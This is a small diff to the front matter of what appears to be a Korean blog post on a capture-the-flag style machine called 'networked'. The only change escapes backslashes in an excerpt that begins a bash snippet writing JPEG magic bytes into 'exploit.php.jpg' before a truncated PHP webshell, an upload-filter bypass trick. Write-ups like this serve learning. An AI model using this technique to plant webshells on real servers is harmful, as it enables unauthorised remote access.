@@ -4,7 +4,7 @@ title: "networked"
 date: 2026-07-08
 category: "리눅스"
 tags: []
-excerpt: "매직 바이트 + PHP 웹쉘 파일 생성 ```bash printf '\xff\xd8\xff' > exploit.php.jpg echo '<?php…"
+excerpt: "매직 바이트 + PHP 웹쉘 파일 생성 ```bash printf '\\xff\\xd8\\xff' > exploit.php.jpg echo '<?php…"
 readingTime: 6
 ---
 
